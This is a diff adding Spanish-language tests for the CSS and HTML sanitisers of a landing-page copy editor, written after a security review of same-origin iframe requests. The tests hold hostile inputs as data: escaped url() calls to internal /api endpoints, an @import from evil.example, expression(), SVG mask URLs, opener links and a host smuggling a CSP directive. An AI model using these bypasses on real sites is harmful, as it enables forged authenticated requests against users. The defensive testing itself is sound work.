@@ -33,10 +33,13 @@ import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
 import {
   clasesDe, contenidoDeCopiaIdentica, fichasDeHtml, partirParaCopia, piezasDeCss, podarCss, sanearInstantanea, selectorParaCopia,
-  selectorVive, separarPorComas, PARTIR_DESDE,
+  selectorVive, separarPorComas, sinDestinosAjenos, PARTIR_DESDE,
 } from '../lib/editor-landing/copia-identica';
 import { JS_ANTES_DE_BAJAR, JS_INSTANTANEA, JS_MIRAR_VISIBLES } from '../lib/editor-landing/copia-identica-script';
-import { CSS_BASE_LIBRE, conVhFijo, documentoEditable, envoltoriosValidos, medioPermitido, rotuloDeSeccion } from '../lib/editor-landing/html-editable';
+import {
+  CSS_BASE_LIBRE, conVhFijo, cssDisenoLimpio, cssSinCargasAjenas, cssSinEscapes, documentoEditable, envoltoriosValidos, medioPermitido, referenciasDeCss,
+  rotuloDeSeccion,
+} from '../lib/editor-landing/html-editable';
 import { htmlDePagina } from '../lib/editor-landing/render';
 import { temaPorId } from '../lib/editor-landing/temas';
 import { CONFIG_DEFAULT } from '../lib/editor-landing/api-tipos';
@@ -264,4 +267,66 @@ test('14. cada texto de la copia se ubica por su sección y se cambia solo («ca
   assert.deepEqual(textos, ['New', 'Customers ask on chat.', "Most platforms can't.", 'Start Free Trial']);
   const otro = conTextos(html, textos.map((x, i) => (i === 1 ? 'Todos tus chats en un solo lugar' : x)));
   assert.equal(otro, html.replace('Customers ask on chat.', 'Todos tus chats en un solo lugar'), 'sólo el título; la sección, igual');
+});
+
+// ── La verificación de 5004dba08 (Cerebro, 28/10/2026: C:/dev/revisiones/2810-verificacion-5004dba08.md) ──────────────
+// El iframe del editor es del MISMO origen que la app: lo que la copia pida a nuestros dominios sale con la sesión de quien
+// edita. Las cargas son las del informe (sus scripts: C:/dev/revisiones/scratch-5004/).
+const BS = String.fromCharCode(92);
+
+test('15. el CSS se mira como lo lee el navegador: escapes, image-set, var(), y lo legítimo sigue (ALTO 1)', () => {
+  for (const malo of [
+    `.a{background-image:${BS}75 rl(/api/x)}`, `.b{cursor:u${BS}rl(/api/c),auto}`, '.c{background-image:image-set("/api/x" 1x)}',
+    `@font-face{font-family:x;src:u${BS}rl(/api/f) format("woff2")}`, `@${BS}69mport url(https://evil.example/x.css);`,
+    '.d{--u:"/api/x";background:image-set(var(--u) 1x)}', '.e{background:cross-fade(url(https://hola-mako.com/api/x), url(https://cdn.x.com/a.png))}',
+    '.f{width:expression(alert(1))}',
+  ]) assert.doesNotMatch(cssDisenoLimpio(malo), /(?:url|image-set|cross-fade)\([^)]*\/api|\\75|u\\rl|evil\.example|image-set\(var|expression/, malo);
+  // (un string suelto en una variable, `--u:"/api/x"`, no pide nada: lo que lo usa como dirección es lo que se va)
+  const bueno = `.g{fill:url(#grad)} .h{background:url(https://cdn.x.com/a.png)} .q::before{content:"${BS}201C"} @font-face{font-family:I;src:url(https://fonts.gstatic.com/i.woff2)} .i{background:image-set("https://cdn.x.com/a.png" 1x)} .s{--svg:url("data:image/svg+xml,%3Csvg%3E%3C/svg%3E")} @font-face{font-family:F;src:url("data:application/font-woff;charset=utf-8;base64,d09G")}`;
+  assert.equal(cssDisenoLimpio(bueno), bueno, 'lo legítimo vuelve byte por byte (el gradiente, una imagen, un ícono en data:, una fuente)');
+  assert.equal(cssSinEscapes(`${BS}75 rl(${BS}2f api)`), 'url(/api)');
+  assert.deepEqual(referenciasDeCss('a{background:image-set("x.png" 1x, url(y.png) 2x)}'), ['y.png', 'x.png']);
+  assert.equal(referenciasDeCss('a{background:image-set(attr(data-x) 1x)}'), null);
+  assert.equal(cssSinCargasAjenas(`.a{color:red;background:u${BS}rl(/api/x);margin:0}`), '.a{color:red;;margin:0}');
+});
+
+test('16. el saneo: style y SVG con la misma vara, cualquier target sin opener, y sin raíz propia (ALTO 1 y 2, bajo)', () => {
+  const r = sanear({
+    html: `<div style="background-image:image-set('https://hola-mako.com/api/ads-manager/ad-aprobacion?ids=1' 1x)">a</div><div style="background:u${BS}rl(https://hola-mako.com/api/y)">b</div><svg><rect mask="url(https://hola-mako.com/api/x)" fill="url(#g)" clip-path="url(/api/z#c)"/></svg><a href="https://evil.example/" target="_BLANK" rel="opener">x</a><a href="https://ok.example/" target="pwn">y</a><div data-gm-raiz><p>z</p></div>`,
+    envoltorios: [`<div style="background:u${BS}rl(/api/x)" data-gm-raiz>`],
+  });
+  assert.doesNotMatch(r.html, /\/api\//);
+  assert.match(r.html, /fill="url\(#g\)"/, 'el gradiente de un SVG queda');
+  assert.equal((r.html.match(/rel="noopener noreferrer"/g) ?? []).length, 2);
+  assert.doesNotMatch(r.html + JSON.stringify(r.envoltorios), /rel="opener"|data-gm-raiz|\/api\//);
+});
+
+test('17. el iframe del editor de una copia lleva SU política (sus orígenes, nunca los nuestros) y no manda referrer; la publicada tampoco (ALTO 1, MEDIO 3)', () => {
+  const d = documentoEditable(`<div style="background:${BS}75 rl(/api/x)"><img src="https://cdn.x.com/a.png"><img src="https://hola-mako.com/vsl-assets/x.png"></div>`, '.a{background:url(https://img.y.com/b.png)}', { sinBase: true });
+  const csp = /http-equiv="Content-Security-Policy" content="([^"]*)"/.exec(d)?.[1] ?? '';
+  assert.match(csp, /img-src data: blob: [^;]*https:\/\/cdn\.x\.com/);
+  assert.match(csp, /https:\/\/img\.y\.com/);
+  assert.doesNotMatch(csp, /hola-mako|'self'|\*/, 'ni nuestros dominios ni comodines');
+  assert.ok(d.indexOf('Content-Security-Policy') < d.indexOf('<style'), 'la política antes que cualquier cosa que cargue');
+  assert.match(d, /<meta name="referrer" content="no-referrer">/);
+  assert.doesNotMatch(documentoEditable('<p>x</p>', ''), /Content-Security-Policy|referrer/, 'un diseño de MaKo, como siempre');
+  const pub = armarDocumento({ html: '<img src="https://rastreo.example/px.gif">', config: CONFIG_DEFAULT, cssDiseno: '.a{}', workspaceId: 3, modo: 'vista', urlCanonica: 'https://hola-mako.site/x' });
+  assert.match(pub, /<meta name="referrer" content="no-referrer">/);
+  // Un host con «;» no entra a la política (partía sus directivas).
+  assert.deepEqual(origenesDeMedios('<img src="https://a;script-src.example/x.png"><img src="https://ok.example/y.png">', '').imagenes, ['https://ok.example']);
+});
+
+test('18. la copia no lleva a la otra: sus enlaces a «#», su agenda fuera (con su lugar), y la capa viva recortada (bajo, MEDIO 4)', () => {
+  const r = sinDestinosAjenos('<iframe src="https://calendly.com/competidor/30min" referrerpolicy="unsafe-url" name="pwn" style="height:600px"></iframe><div data-calendly="https://calendly.com/x/y"></div><a href="https://app.competidor.com/signup">Probar</a><a href="#planes">Planes</a><iframe src="https://meetings.hubspot.com/competidor/demo"></iframe><iframe src="https://www.youtube.com/embed/x"></iframe>');
+  assert.equal(r.agendas, 3);
+  assert.equal(r.enlaces, 1);
+  assert.doesNotMatch(r.html, /src="https:\/\/(?:calendly\.com|meetings\.hubspot)|data-calendly|competidor\.com\/signup|unsafe-url/);
+  assert.match(r.html, /<div style="height:600px" data-gm-agenda-original="calendly\.com"><\/div>/, 'su lugar queda, marcado');
+  assert.match(r.html, /href="#planes"/);
+  assert.match(r.html, /youtube\.com\/embed/, 'un video no es una agenda');
+  const rep = fuente('lib/editor-landing/replicar.ts');
+  assert.match(rep, /const d = sinDestinosAjenos\(limpio\);/);
+  const vista = fuente('app/web-generator/editor/nodos/HtmlEditableVista.tsx');
+  assert.match(vista, /const lugar = \(el: Element\) => \{\n\s*const r = recortarALaCaja\(el\.getBoundingClientRect\(\)\);/);
+  assert.match(vista, /return \{ x, y, w: Math\.min\(ancho, r\.right\) - x, h: Math\.min\(alto, r\.bottom\) - y \};/);
 });
